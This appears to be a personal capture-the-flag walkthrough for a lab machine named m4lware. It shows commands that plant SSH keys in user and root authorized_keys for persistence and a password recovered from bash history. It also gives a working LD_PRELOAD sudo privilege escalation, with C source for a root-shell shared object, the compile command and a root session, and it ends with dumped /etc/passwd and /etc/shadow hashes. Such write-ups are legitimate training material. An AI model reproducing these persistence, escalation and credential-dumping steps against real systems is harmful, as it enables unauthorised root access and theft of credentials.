### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDJSv5ppl9yc8gwVeZELZWUtKx6E64GEEsCS7PH2Y+AkViBcbXvxuuyLHuyhTPtNmAAG2OJIDavxgNiiwUAFwV2pipCaNWUpNmhdsmNfaqjhH/oevbncTUmCwET6CIApEwcgUW/m8zw3wAjbQru26ebf0hMt34tX+bv4j4bMCvTHtsdhzOqLAxI8o4md5V2iG8c0zDo3Y0qn2enwTCfwFC+TliSjeVjttCFr2fvkeGLrLYw3zCBOl/9AXlmZs8cOvy8evgU0Itg+5xjBNk/tfDeRCidzpzzEwFOjClcbA9RCdHc9pQSsMGmH6m9OO/dBPHOmfnPBqLseU1hbv6OCsK/ZufJHdTSR6hJH89k+c09KYu/VvZB3l37ZXMbGzE0uTb+Iv0+dzpbgsyUzthsZb7zaekZio6Lk/DboCXd5EkZb5JXLaeMhbK0LcaRQoEGcel7+CdnssYoYQKRRx20B8z5a3fmG1AXnJsmJSnVg2QX8F0dBLDHs1TN6+uwIAL2H4PG960pjuhQr3hXJWayzWSIkl34JDPmH3P7kqdyj1P/0jK33ssrl9ElOpc4p9XQSE1O7Rs7/PBpSE+K49PyLeuAXFr3F4gxpOTJvva3QpAVEWSX8o4W5apJzFkY/XVjn1N1dtwna2CYelGz03tJXFAtLw+ukJX00e52CeNzLAzLSQ== your_email@example.com" >> /home/sad/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCwq7lyA0mkO83WexP5tMko5Yqd84jqV88dEnUOY5UztzTjzRCPvad92JEyjwe9/dl+QJn6SNSi4/x8Y0wfe1nVanHC2+5H1TrJpwweyur2uFRm+BhsxFw3dRBWbePU0tQpmXKAODGJMKFLUBQlozMVCADtRecu2FQCVCUyr8s/XCVjK5RHdBDUBc2e4XfgU+e4HFqjU0zQmZe53p+6DT0lG9QdInKdbfeGxVETz+bbam2QbAQoTgGOssI9ou1VKYc0qZfCz3OHImjx0LkjwzTo1Az/bFZo5JRB1PrMD/WYyZ/nL/FjJBdhTlgyogTwwRguPKzCcTJB+LcMABwpNCh6G4goJ2pxrglJ0CyrrvCSWaIf/OEBTNZCyFNOCNOPeg6Fv8OWSwqayY4Cs3nV67x3clotjTB7c322Di5UZGsoCQWUfY281/GsYv+m0gS5UH+jjtWRHUIcJGJwjFqAyZ60rTG0JT/p5RKDlksOnIapubtdjzUxNIrxu4l6XHXgLX5DZnhZpjMVEN3u2PPBcbLDr6Bkr3NmQwT1l6MeOl89uZzIUO1p6wchtZSsECSJeZ6lYfuNBw4fd35mtDaKXHFJbiJZF+iNCs8ljPMM+2NmsJ68NUJBAECmAaQf4h64v9mKbEreVQKW/tG8bpZI2VjTgRY8I4LUdzfMEcKAdkrQpQ== your_email@example.com" >> /root/.ssh/authorized_keys
```


```
ssh -i saad_rsa saad@10.10.164.66 
sweetness
```

we get on the box 

```
Enter passphrase for key 'saad_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 22 Nov 2024 08:39:03 AM UTC

  System load:  0.0               Processes:             115
  Usage of /:   57.6% of 8.02GB   Users logged in:       0
  Memory usage: 54%               IPv4 address for eth0: 10.10.164.66
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

58 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@m4lware:~$ whoami
saad
saad@m4lware:~$ uname -a
Linux m4lware 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
saad@m4lware:~$
```

/home/saad/user.txt

```
9a1ce90a7653d74ab98630b47b8b4a84
```


```
[-] Accounts that have recently used sudo:
/home/saad/.sudo_as_admin_successful
```

```
══════════╣ Searching passwords in history files
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:echo "saad:MyStrongestPasswordYet$4291" > creds.txt
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:mysql -u root -p
/home/saad/.bash_history:mysql -u root
/home/saad/.bash_history:sudo su
/home/saad/.bash_history:ssh root@192.169.155.104
/home/saad/.bash_history:mysql -u user -p
/home/saad/.bash_history:mysql -u db_user -p
/home/saad/.bash_history:ls -ld /var/lib/mysql

```

in .bash_history
```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```

try sudo with that password

```
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```


###  LD_Preload

seeing the LD_preload, we can dictate the value of this environmental variable when running a binary, in this case PING

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

```
cd /tmp
nano shell.c
```

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
```

now trying sudo with custom env variable and ping file

```
sudo LD_PRELOAD=/tmp/shell.so ping
```

```
saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
# whoami
root
# uname -a
Linux m4lware 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
# sudo -l
Matching Defaults entries for root on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User root may run the following commands on m4lware:
    (ALL : ALL) ALL
# 
```

/root/root.txt

```
992bfd94b90da48634aed182aae7b99f
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
saad:x:1000:1000:saad:/home/saad:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

/etc/shadow

```
root:$6$HDgtQ6h0zfUNqR02$pY6Ec8s8CS6diieLmxVs2aFfods/GxKRMB9VF/qeK.e9DiO/lkZoFc48LsZEsWSv3aJCBA.LYXktvy8TwWChD.:19486:0:99999:7:::
daemon:*:19235:0:99999:7:::
bin:*:19235:0:99999:7:::
sys:*:19235:0:99999:7:::
sync:*:19235:0:99999:7:::
games:*:19235:0:99999:7:::
man:*:19235:0:99999:7:::
lp:*:19235:0:99999:7:::
mail:*:19235:0:99999:7:::
news:*:19235:0:99999:7:::
uucp:*:19235:0:99999:7:::
proxy:*:19235:0:99999:7:::
www-data:*:19235:0:99999:7:::
backup:*:19235:0:99999:7:::
list:*:19235:0:99999:7:::
irc:*:19235:0:99999:7:::
gnats:*:19235:0:99999:7:::
nobody:*:19235:0:99999:7:::
systemd-network:*:19235:0:99999:7:::
systemd-resolve:*:19235:0:99999:7:::
systemd-timesync:*:19235:0:99999:7:::
messagebus:*:19235:0:99999:7:::
syslog:*:19235:0:99999:7:::
_apt:*:19235:0:99999:7:::
tss:*:19235:0:99999:7:::
uuidd:*:19235:0:99999:7:::
tcpdump:*:19235:0:99999:7:::
landscape:*:19235:0:99999:7:::
pollinate:*:19235:0:99999:7:::
usbmux:*:19329:0:99999:7:::
sshd:*:19329:0:99999:7:::
systemd-coredump:!!:19377::::::
saad:$6$ggS24MpcYt2PzO9q$ILTDqX6vMvDvf3K8VjI.2aHKT3v/He0kVGkBm/Pn57z3Oyo1lVedIU5.49rO2NGi.h/9efWoXVD9Xr0ApcnA.1:19378:0:99999:7:::
lxd:!:19377::::::
mysql:!:19377:0:99999:7:::
```